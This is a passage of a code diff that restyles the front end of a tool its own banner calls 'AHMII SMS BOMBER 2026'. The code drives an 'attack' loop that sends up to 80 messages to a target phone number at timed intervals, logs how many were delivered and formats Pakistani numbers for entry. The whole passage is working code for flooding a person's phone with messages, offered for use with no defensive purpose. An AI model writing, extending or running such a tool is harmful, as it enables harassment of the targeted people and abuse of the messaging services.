-            if (stopRequested || !isAttacking) {
-                addLog(` Attack stopped by user`, false);
-                showToast('Attack aborted', 'error');
+            if (stopSignal || !isActive) {
+                addLogEntry(`aborted by command`, false);
+                displayToast('attack stopped', false);
                 break;
             }
 
-            const result = await sendMessage(international, i);
-            
-            if (result.success) {
-                successTotal++;
-                addLog(` Msg ${i}  DELIVERED to ${international}`, true);
+            const outcome = await sendOne(intlNumber, i);
+            if (outcome.success) {
+                delivered++;
+                addLogEntry(`✓ msg ${i} · delivered to ${intlNumber}`, true);
             } else {
-                failTotal++;
-                addLog(` Msg ${i}  FAILED (${result.error || 'API error'})`, false);
+                addLogEntry(`✗ msg ${i} · failed`, false);
             }
-            
+
             sent++;
-            updateUI();
-            
-            if (i < amount && delay > 0 && !stopRequested && isAttacking) {
-                await new Promise(resolve => {
-                    const timer = setTimeout(resolve, delay);
-                    activeTimers.push(timer);
-                });
+            updateProgressBar();
+
+            if (i < amount && delayVal > 0 && !stopSignal && isActive) {
+                await new Promise(r => { activeTimout = setTimeout(r, delayVal); });
             }
         }
 
-        const successRate = sent ? Math.round((successTotal / sent) * 100) : 0;
-
-        if (!stopRequested && isAttacking) {
-            if (successTotal > 0) {
-                showToast(` Complete! ${successTotal}/${sent} messages delivered (${successRate}%)`, 'success');
-                addLog(` FINISHED  Delivered: ${successTotal}/${sent} | Success rate: ${successRate}%`, true);
+        if (!stopSignal && isActive) {
+            if (delivered > 0) {
+                displayToast(`✦ completed · ${delivered}/${sent} messages delivered ✦`, true);
+                addLogEntry(`✦ completed — ${delivered} delivered ✦`, true);
             } else {
-                showToast(` Attack finished  0 messages delivered. Target may be invalid.`, 'error');
-                addLog(` ZERO delivery  target number may be invalid or API issue`, false);
+                displayToast(`⚠️ completed · 0 messages delivered`, false);
+                addLogEntry(`⚠️ zero delivery — target may be invalid`, false);
             }
         }
 
         resetUI();
-        setTimeout(() => {
-            if (!isAttacking) progressArea.style.display = 'none';
-        }, 1000);
+        setTimeout(() => { if (!isActive) progressPanel.style.display = 'none'; }, 800);
     }
 
-    function abortAttack() {
-        if (!isAttacking) return;
-        stopRequested = true;
-        isAttacking = false;
-        addLog(` ABORT signal sent  stopping remaining messages`, false);
-        showToast('Aborting attack...', 'error');
+    function haltAttack() {
+        if (!isActive) return;
+        stopSignal = true;
+        isActive = false;
+        if (activeTimout) clearTimeout(activeTimout);
+        addLogEntry(`ABORT — attack halted`, false);
+        displayToast('attack aborted', false);
         resetUI();
-        progressArea.style.display = 'none';
-        document.querySelector('.premium-card')?.classList.remove('attacking');
+        progressPanel.style.display = 'none';
+        document.querySelector('.luxury-card')?.classList.remove('attacking');
     }
 
-    // Event Listeners
-    document.querySelectorAll('.format-chip').forEach(chip => {
-        chip.addEventListener('click', () => {
-            const format = chip.getAttribute('data-format');
-            if (format === '92') numberInput.value = '92';
-            else if (format === '03') numberInput.value = '03';
-            else if (format === 'clear') numberInput.value = '';
-            numberInput.focus();
+    // Format buttons
+    document.querySelectorAll('.format-option').forEach(btn => {
+        btn.addEventListener('click', () => {
+            const val = btn.getAttribute('data-val');
+            if (val === '92') phoneField.value = '92';
+            else if (val === '03') phoneField.value = '03';
+            else if (val === 'clear') phoneField.value = '';
+            phoneField.focus();
         });
     });
 
-    numberInput.addEventListener('input', function() {
-        let val = this.value.replace(/\D/g, '');
-        if (val.startsWith('92') && val.length > 12) val = val.slice(0, 12);
-        if (val.startsWith('03') && val.length > 11) val = val.slice(0, 11);
-        this.value = val;
+    phoneField.addEventListener('input', (e) => {
+        let val = e.target.value.replace(/\D/g, '');
+        if (val.startsWith('92') && val.length > 12) val = val.slice(0,12);
+        if (val.startsWith('03') && val.length > 11) val = val.slice(0,11);
+        phoneField.value = val;
     });
 
-    amountInput.addEventListener('change', () => {
-        let v = parseInt(amountInput.value);
-        if (v > 100) amountInput.value = 100;
-        if (v < 1) amountInput.value = 1;
+    quantityField.addEventListener('change', () => {
+        let v = parseInt(quantityField.value);
+        if (v > 80) quantityField.value = 80;
+        if (v < 1) quantityField.value = 1;
     });
-    
-    delayInput.addEventListener('change', () => {
-        let d = parseInt(delayInput.value);
-        if (d > 3000) delayInput.value = 3000;
-        if (d < 300) delayInput.value = 300;
+    delayField.addEventListener('change', () => {
+        let d = parseInt(delayField.value);
+        if (d > 2500) delayField.value = 2500;
+        if (d < 300) delayField.value = 300;
     });
 
-    startBtn.addEventListener('click', startAttack);
-    abortBtn.addEventListener('click', abortAttack);
+    launchButton.addEventListener('click', beginAttack);
+    abortButton.addEventListener('click', haltAttack);
 
-    // Particles Background
-    for (let i = 0; i < 80; i++) {
-        const particle = document.createElement('div');
-        particle.classList.add('particle');
-        const size = Math.random() * 3 + 1;
-        particle.style.width = size + 'px';
-        particle.style.height = size + 'px';
-        particle.style.left = Math.random() * 100 + '%';
-        particle.style.top = Math.random() * 100 + '%';
-        particle.style.animationDelay = Math.random() * 5 + 's';
-        particle.style.animationDuration = 5 + Math.random() * 7 + 's';
-        document.getElementById('particlesContainer')?.appendChild(particle);
-    }
-
-    console.log('%c AHMII SMS BOMBER 2026 | Fixed Edition ', 'color: #00ffcc; font-size: 14px; font-weight: bold;');
-    console.log('%cNow working with proper API handling', 'color: #aaa; font-size: 12px;');
+    // Silent branding in console (no visible logs, just style)
+    console.log('%c✨ AHMII SMS BOMBER — Luxury Edition 2026 ✨', 'color: #D4AF37; font-size: 12px; font-weight: bold;');
 </script>
 </body>
 </html>
